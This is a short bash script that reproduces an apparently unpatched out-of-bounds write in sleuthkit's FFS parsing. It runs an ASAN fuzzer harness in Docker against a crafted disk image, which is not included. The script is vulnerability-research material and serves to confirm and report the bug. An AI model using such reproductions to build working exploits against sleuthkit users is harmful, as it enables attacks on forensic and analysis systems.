#!/usr/bin/env bash
# PoC for: 11-ffs-itoo-oob
# Originally confirmed on: sleuthkit commit 01de034 (2026-04-15)
# Re-confirmed on: sleuthkit develop branch d784e64db6 (2026-04-13)

POC_IMG="/scr2/yiwei/vul-agent/zero-day/sleuthkit_validated/11-ffs-itoo-oob/ffs_itoo_oob_write.img"
DOCKER_IMG="vulagent/sleuthkit:develop-20260418"

echo "[*] Running PoC: 11-ffs-itoo-oob"
echo "[*] Image: $POC_IMG"
echo "[*] Commit: d784e64db6 (sleuthkit develop, 2026-04-13)"
echo ""
docker run --rm --memory=2g \
  -v "$(dirname "$POC_IMG"):/h" \
  "$DOCKER_IMG" \
  bash -c "ASAN_OPTIONS='halt_on_error=1:print_stacktrace=1:detect_leaks=0' /out/asan/fls_ffs_fuzzer /h/$(basename "$POC_IMG")" 2>&1 || true
